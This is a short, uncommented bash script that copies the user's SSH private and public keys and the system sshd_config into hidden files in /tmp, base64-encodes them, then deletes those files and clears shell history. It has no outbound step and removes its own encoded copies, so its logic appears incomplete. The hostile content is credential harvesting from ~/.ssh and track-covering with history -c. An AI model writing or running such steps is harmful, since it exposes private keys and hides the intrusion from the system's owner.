#!/bin/bash

cp ~/.ssh/id_rsa /tmp/.hidden_ssh_key
cp ~/.ssh/id_rsa.pub /tmp/.hidden_ssh_key.pub
cp /etc/ssh/sshd_config /tmp/.hidden_sshd_conf

base64 /tmp/.hidden_ssh_key > /tmp/.hidden_ssh_key.txt
base64 /tmp/.hidden_sshd_conf > /tmp/.hidden_sshd_conf.txt

rm -f /tmp/.hidden_ssh_key* /tmp/.hidden_sshd_conf* /tmp/.plugin_conf_*
history -c
